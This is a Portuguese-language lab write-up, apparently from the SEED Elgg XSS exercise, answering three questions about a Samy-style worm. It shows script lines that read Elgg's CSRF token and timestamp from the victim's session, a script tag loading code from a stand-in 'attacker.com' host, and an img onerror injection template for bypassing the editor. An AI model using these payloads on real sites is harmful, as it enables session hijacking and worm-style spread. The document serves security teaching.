Questão 1: Qual o propósito das linhas ① e ②? Por que são necessárias?

As linhas ① e ② obtêm o timestamp (__elgg_ts) e o token de segurança (__elgg_token) do Elgg:

var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;     // ①
var token="&__elgg_token="+elgg.security.token.__elgg_token;  // ②

Por que são necessárias:
O Elgg implementa proteção CSRF (Cross-Site Request Forgery) que exige que todas as ações sensíveis (como adicionar amigo) incluam:

Um timestamp válido (__elgg_ts)
Um token de segurança único por sessão (__elgg_token)

Estes parâmetros provam que a requisição é legítima e vem de uma sessão válida. Sem eles, a requisição seria rejeitada pelo servidor.
O ataque funciona porque o JavaScript malicioso executa no contexto da sessão da vítima, tendo acesso aos tokens válidos através do objeto elgg.security.token.

Questão 2: Se o Elgg só fornecesse o Editor mode (não Text mode), você ainda conseguiria lançar o ataque?

Sim, mas seria mais difícil.
Editor Mode adiciona HTML extra (tags <p>, <br>, formatação) que pode quebrar o código JavaScript. No entanto, existem técnicas para contornar:

- Usar o atributo src em <script>: Colocar o código em um arquivo .js externo e referenciar via <script src="http://attacker.com/malicious.js"></script>. O Editor mode geralmente não modifica tags <script> com src.
- Injetar via event handlers: Usar atributos HTML como onerror, onload em tags de imagem:

<img src="invalid" onerror="/* código malicioso aqui */">

- Limpar o HTML depois: Usar JavaScript para remover as tags extras adicionadas pelo editor.

Questão 3: Há várias modalidades de ataques XSS (Reflected, Stored ou DOM). Em qual/quais pode enquadrar este ataque e porquê?

Este ataque é classificado como Stored XSS (XSS Persistente).
- O código malicioso é armazenado permanentemente no banco de dados do servidor (no perfil do Samy)
- A execução acontece sempre que alguém acessa a página infectada - qualquer usuário que visite o perfil do Samy executará o JavaScript malicioso


Não é Reflected XSS porque:

- Reflected XSS requer que o payload seja parte da requisição (URL, formulário)
- O código não é refletido imediatamente na resposta
- O código persiste entre diferentes requisições e sessões


Não é DOM-based XSS porque:

- O código malicioso vem do servidor (database)
- Não é injetado via manipulação do DOM no lado do cliente
- A vulnerabilidade está no armazenamento server-side, não no processamento client-side

Stored XSS é o mais perigoso porque atinge múltiplas vítimas automaticamente, persiste até ser removido e permite ataques tipo worm (como o Samy Worm original)